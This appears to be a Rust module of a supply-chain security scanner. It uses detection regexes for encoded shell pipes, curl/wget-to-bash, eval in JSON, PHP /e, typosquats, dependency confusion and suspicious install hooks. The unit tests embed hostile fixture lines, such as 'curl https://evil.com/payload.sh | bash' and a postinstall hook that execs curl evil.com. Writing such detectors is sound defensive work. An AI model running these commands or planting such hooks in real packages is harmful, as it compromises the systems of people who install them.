use crate::config::ObfuscationConfig;
use crate::event::{AuditFinding, Severity};
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

use super::{is_language, levenshtein};

// --- Lazy-compiled regex patterns ---

static RE_PREG_REPLACE_E: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"preg_replace\s*\(\s*['"].*?/[a-z]*e[a-z]*['"]\s*,"#).unwrap());

static RE_PROXY_REFLECT: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"new\s+Proxy\s*\(|Reflect\.(apply|construct|get)\s*\(").unwrap());

static RE_JSON_EVAL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)(eval\s*\(|Function\s*\(|javascript\s*:|<script)"#).unwrap());

static RE_ENCODED_SHELL_B64: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"echo\s+[A-Za-z0-9+/]{10,}={0,2}\s*\|\s*base64\s+-d\s*\|\s*(sh|bash)").unwrap()
});

static RE_CURL_PIPE_SHELL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"curl\s+[^\|]+\|\s*(sh|bash)").unwrap());

static RE_WGET_PIPE_SHELL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"wget\s+[^\|]+\|\s*(sh|bash)").unwrap());

static RE_PYTHON_BASE64_EXEC: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"python[23]?\s+-c\s+['"]import\s+base64"#).unwrap());

static RE_INSTALL_SCRIPT_NODE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"node\s+-e\s+['".]"#).unwrap());

static RE_INSTALL_SCRIPT_PYTHON: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"python[23]?\s+-c\s+['".]"#).unwrap());

static RE_INSTALL_SCRIPT_HIDDEN_DIR: Lazy<Regex> = Lazy::new(|| Regex::new(r"\./\.\w+").unwrap());

static RE_INSTALL_SCRIPT_ENV_URL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\$\w+.*https?://"#).unwrap());

/// Popular npm packages for typosquat detection.
const POPULAR_NPM: &[&str] = &[
    "express",
    "react",
    "lodash",
    "axios",
    "webpack",
    "babel",
    "eslint",
    "typescript",
    "mocha",
    "jest",
    "chalk",
    "commander",
    "request",
    "underscore",
    "async",
    "moment",
    "debug",
    "uuid",
    "glob",
    "minimist",
    "mkdirp",
    "rimraf",
    "semver",
    "yargs",
    "colors",
    "bluebird",
    "cheerio",
    "dotenv",
    "mongoose",
    "socket.io",
    "redis",
    "pg",
    "mysql",
    "sqlite3",
    "passport",
    "bcrypt",
    "jsonwebtoken",
    "cors",
    "helmet",
    "nodemon",
    "pm2",
    "prettier",
    "esbuild",
    "vite",
    "rollup",
    "parcel",
    "turbo",
];

/// Popular pip packages for typosquat detection.
const POPULAR_PIP: &[&str] = &[
    "requests",
    "flask",
    "django",
    "numpy",
    "pandas",
    "scipy",
    "matplotlib",
    "tensorflow",
    "torch",
    "scikit-learn",
    "pillow",
    "boto3",
    "celery",
    "redis",
    "sqlalchemy",
    "pytest",
    "setuptools",
    "pip",
    "wheel",
    "cryptography",
    "pyyaml",
    "httpx",
    "fastapi",
    "uvicorn",
    "gunicorn",
    "beautifulsoup4",
    "selenium",
    "scrapy",
    "paramiko",
    "fabric",
];

/// Scan a single line for Tier 3 supply chain patterns.
pub fn scan_line(
    line: &str,
    line_number: usize,
    file_path: &str,
    path: &Path,
    findings: &mut Vec<AuditFinding>,
) {
    // Rule 21: PHP preg_replace with /e modifier
    if is_language(path, &["php"]) && RE_PREG_REPLACE_E.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-php-preg-replace-e".to_string(),
            severity: Severity::Critical,
            description: "preg_replace() with /e modifier — executes replacement as PHP code"
                .to_string(),
            matched_pattern: "preg_replace /e".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 23: Proxy/Reflect patterns in JS/TS
    if is_language(path, &["js", "ts", "jsx", "tsx", "mjs", "cjs"])
        && RE_PROXY_REFLECT.is_match(line)
    {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-proxy-reflect".to_string(),
            severity: Severity::Medium,
            description: "Proxy/Reflect metaprogramming — can intercept property access"
                .to_string(),
            matched_pattern: "proxy/reflect".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 24: Eval/Function/script in JSON files
    if is_language(path, &["json"]) && RE_JSON_EVAL.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-json-eval".to_string(),
            severity: Severity::Critical,
            description: "Code execution pattern in JSON file".to_string(),
            matched_pattern: "json eval".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 25: Encoded shell commands
    if RE_ENCODED_SHELL_B64.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-encoded-shell".to_string(),
            severity: Severity::Critical,
            description: "Base64-encoded shell command piped to interpreter".to_string(),
            matched_pattern: "encoded shell".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    } else if RE_CURL_PIPE_SHELL.is_match(line) || RE_WGET_PIPE_SHELL.is_match(line) {
        // curl|bash is standard practice in Dockerfiles — skip those
        let is_dockerfile = path
            .file_name()
            .and_then(|n| n.to_str())
            .is_some_and(|n| n.eq_ignore_ascii_case("dockerfile") || n.starts_with("Dockerfile."));
        if !is_dockerfile {
            findings.push(AuditFinding {
                file_path: file_path.to_string(),
                line_number: Some(line_number),
                rule_id: "obfuscation-encoded-shell".to_string(),
                severity: Severity::Critical,
                description: "Remote script piped directly to shell interpreter".to_string(),
                matched_pattern: "curl/wget pipe shell".to_string(),
                context_lines: vec![truncate_line(line)],
            });
        }
    } else if RE_PYTHON_BASE64_EXEC.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-encoded-shell".to_string(),
            severity: Severity::Critical,
            description: "Python one-liner with base64 import — likely encoded payload".to_string(),
            matched_pattern: "python base64 exec".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }
}

/// Rule 18: Typosquat detection in package manifests.
pub fn check_typosquat(dir: &Path, config: &ObfuscationConfig) -> Vec<AuditFinding> {
    if !config.enable_typosquat {
        return Vec::new();
    }

    let mut findings = Vec::new();

    // Check package.json
    let pkg_json = dir.join("package.json");
    if pkg_json.exists() {
        if let Ok(content) = std::fs::read_to_string(&pkg_json) {
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                let file_path = pkg_json.to_string_lossy().to_string();
                for section in ["dependencies", "devDependencies"] {
                    if let Some(deps) = json.get(section).and_then(|d| d.as_object()) {
                        for dep_name in deps.keys() {
                            if let Some(finding) =
                                check_package_typosquat(dep_name, POPULAR_NPM, &file_path)
                            {
                                findings.push(finding);
                            }
                        }
                    }
                }
            }
        }
    }

    // Check requirements.txt
    let req_txt = dir.join("requirements.txt");
    if req_txt.exists() {
        if let Ok(content) = std::fs::read_to_string(&req_txt) {
            let file_path = req_txt.to_string_lossy().to_string();
            for line in content.lines() {
                let pkg = line
                    .split(&['=', '>', '<', '!', '[', ';'][..])
                    .next()
                    .unwrap_or("")
                    .trim();
                if !pkg.is_empty() && !pkg.starts_with('#') {
                    if let Some(finding) = check_package_typosquat(pkg, POPULAR_PIP, &file_path) {
                        findings.push(finding);
                    }
                }
            }
        }
    }

    findings
}

/// Rule 19: Dependency confusion detection.
pub fn check_dependency_confusion(dir: &Path, config: &ObfuscationConfig) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    let pkg_json = dir.join("package.json");
    if !pkg_json.exists() {
        return findings;
    }

    let content = match std::fs::read_to_string(&pkg_json) {
        Ok(c) => c,
        Err(_) => return findings,
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return findings,
    };

    let file_path = pkg_json.to_string_lossy().to_string();
    let internal_markers = ["-internal", "-private", "-corp", "-infra"];

    for section in ["dependencies", "devDependencies"] {
        if let Some(deps) = json.get(section).and_then(|d| d.as_object()) {
            for dep_name in deps.keys() {
                // Check for scoped packages that look internal
                let looks_internal = dep_name.starts_with('@')
                    || internal_markers.iter().any(|m| dep_name.contains(m));

                // Check against known prefixes from config
                let matches_prefix = config
                    .known_internal_prefixes
                    .iter()
                    .any(|prefix| dep_name.starts_with(prefix.as_str()));

                if looks_internal || matches_prefix {
                    // Check if there's a .npmrc with registry config
                    let has_private_registry = dir.join(".npmrc").exists();

                    if !has_private_registry {
                        findings.push(AuditFinding {
                            file_path: file_path.clone(),
                            line_number: None,
                            rule_id: "obfuscation-dependency-confusion".to_string(),
                            severity: Severity::High,
                            description: format!(
                                "Internal-looking package '{}' without private registry (.npmrc)",
                                dep_name
                            ),
                            matched_pattern: "dependency confusion".to_string(),
                            context_lines: vec![format!(
                                "Consider adding .npmrc with registry config for scoped packages"
                            )],
                        });
                    }
                }
            }
        }
    }

    findings
}

/// Rule 20: Suspicious install scripts in package manifests.
pub fn check_install_scripts(dir: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    let pkg_json = dir.join("package.json");
    if !pkg_json.exists() {
        return findings;
    }

    let content = match std::fs::read_to_string(&pkg_json) {
        Ok(c) => c,
        Err(_) => return findings,
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return findings,
    };

    let file_path = pkg_json.to_string_lossy().to_string();
    let install_hooks = [
        "preinstall",
        "postinstall",
        "preuninstall",
        "postuninstall",
        "prepare",
    ];

    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        for hook in &install_hooks {
            if let Some(script) = scripts.get(*hook).and_then(|v| v.as_str()) {
                let mut suspicious = Vec::new();

                if RE_INSTALL_SCRIPT_NODE.is_match(script) {
                    suspicious.push("node -e inline execution");
                }
                if RE_INSTALL_SCRIPT_PYTHON.is_match(script) {
                    suspicious.push("python -c inline execution");
                }
                if RE_INSTALL_SCRIPT_HIDDEN_DIR.is_match(script) {
                    suspicious.push("hidden directory reference");
                }
                if RE_INSTALL_SCRIPT_ENV_URL.is_match(script) {
                    suspicious.push("environment variable URL");
                }

                for reason in suspicious {
                    findings.push(AuditFinding {
                        file_path: file_path.clone(),
                        line_number: None,
                        rule_id: "obfuscation-install-script-chain".to_string(),
                        severity: Severity::Critical,
                        description: format!("Suspicious '{}' install script: {}", hook, reason),
                        matched_pattern: "install script chain".to_string(),
                        context_lines: vec![format!("\"{}\": \"{}\"", hook, script)],
                    });
                }
            }
        }
    }

    findings
}

fn check_package_typosquat(name: &str, popular: &[&str], file_path: &str) -> Option<AuditFinding> {
    let name_lower = name.to_lowercase();

    for &popular_name in popular {
        if name_lower == popular_name {
            return None; // Exact match, not a typosquat
        }

        if levenshtein(&name_lower, popular_name) == 1 {
            return Some(AuditFinding {
                file_path: file_path.to_string(),
                line_number: None,
                rule_id: "obfuscation-typosquat".to_string(),
                severity: Severity::High,
                description: format!(
                    "Package '{}' is 1 edit away from popular package '{}'",
                    name, popular_name
                ),
                matched_pattern: "typosquat".to_string(),
                context_lines: vec![format!("{} ~= {}", name, popular_name)],
            });
        }
    }

    None
}

fn truncate_line(line: &str) -> String {
    if line.len() > 120 {
        format!("{}...", &line[..120])
    } else {
        line.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_preg_replace_e() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.php");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"preg_replace('/test/e', '$_GET[cmd]', $input);"#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-php-preg-replace-e"));
    }

    #[test]
    fn test_json_eval() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.json");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"{{"key": "eval(atob('bWFsaWNpb3Vz'))"}}"#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-json-eval"));
    }

    #[test]
    fn test_encoded_shell_base64() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("install.sh");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "echo dGVzdHBheWxvYWQ= | base64 -d | sh").unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-encoded-shell"));
    }

    #[test]
    fn test_curl_pipe_shell() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("setup.sh");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "curl https://evil.com/payload.sh | bash").unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-encoded-shell"));
    }

    #[test]
    fn test_typosquat_detection() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        let mut f = std::fs::File::create(&pkg).unwrap();
        writeln!(f, r#"{{"dependencies": {{"expres": "^4.0.0"}}}}"#).unwrap();

        let config = ObfuscationConfig {
            enable_typosquat: true,
            ..ObfuscationConfig::default()
        };
        let findings = check_typosquat(dir.path(), &config);
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-typosquat"));
    }

    #[test]
    fn test_typosquat_exact_match_ok() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        let mut f = std::fs::File::create(&pkg).unwrap();
        writeln!(f, r#"{{"dependencies": {{"express": "^4.0.0"}}}}"#).unwrap();

        let config = ObfuscationConfig {
            enable_typosquat: true,
            ..ObfuscationConfig::default()
        };
        let findings = check_typosquat(dir.path(), &config);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_typosquat_disabled() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        let mut f = std::fs::File::create(&pkg).unwrap();
        writeln!(f, r#"{{"dependencies": {{"expres": "^4.0.0"}}}}"#).unwrap();

        let config = ObfuscationConfig::default(); // enable_typosquat defaults to false
        let findings = check_typosquat(dir.path(), &config);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_dependency_confusion() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        let mut f = std::fs::File::create(&pkg).unwrap();
        writeln!(
            f,
            r#"{{"dependencies": {{"@mycompany/utils-internal": "^1.0.0"}}}}"#
        )
        .unwrap();

        let config = ObfuscationConfig::default();
        let findings = check_dependency_confusion(dir.path(), &config);
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-dependency-confusion"));
    }

    #[test]
    fn test_dependency_confusion_with_npmrc() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        let mut f = std::fs::File::create(&pkg).unwrap();
        writeln!(
            f,
            r#"{{"dependencies": {{"@mycompany/utils-internal": "^1.0.0"}}}}"#
        )
        .unwrap();

        // Create .npmrc to indicate private registry
        let npmrc = dir.path().join(".npmrc");
        std::fs::write(&npmrc, "@mycompany:registry=https://npm.mycompany.com").unwrap();

        let config = ObfuscationConfig::default();
        let findings = check_dependency_confusion(dir.path(), &config);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_install_script_chain() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        let mut f = std::fs::File::create(&pkg).unwrap();
        writeln!(
            f,
            r#"{{"scripts": {{"postinstall": "node -e 'require(\"child_process\").exec(\"curl evil.com\")'" }}}}"#
        )
        .unwrap();

        let findings = check_install_scripts(dir.path());
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-install-script-chain"));
    }

    #[test]
    fn test_proxy_reflect() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "const p = new Proxy(target, handler);").unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings
            .iter()
            .any(|f| f.rule_id == "obfuscation-proxy-reflect"));
    }
}
